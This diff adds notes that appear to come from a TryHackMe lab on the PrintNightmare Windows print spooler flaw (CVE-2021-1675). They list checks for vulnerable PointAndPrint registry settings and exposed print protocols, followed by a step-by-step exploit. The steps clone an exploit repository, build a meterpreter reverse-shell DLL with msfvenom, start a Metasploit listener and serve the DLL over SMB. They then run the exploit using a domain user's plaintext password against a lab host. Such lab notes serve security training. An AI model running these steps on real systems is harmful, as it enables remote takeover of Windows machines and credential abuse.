@@ -1,0 +1,19 @@
+- vulnerability indicator : 
+    command : REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
+    results : HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint
+        RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
+        NoWarningNoElevationOnInstall    REG_DWORD    0x1
+    
+    command : rpcdump.py @10.10.39.157 | egrep 'MS-RPRN|MS-PAR' 
+    results : Protocol: [MS-RPRN]: Print System Remote Protocol 
+        Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
+    
+- exploitation
+    - git clone https://github.com/tryhackme/CVE-2021-1675.git printnightmare
+    - msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL-IP> LPORT=4444 -f dll -o malicious.dll
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lhost tun0
+    set lport VALUE
+    - smbserver.py network . -smb2support 
+    - python3.9 printnightmare/CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.39.157 '\\10.4.73.73\share\malicious.dll'
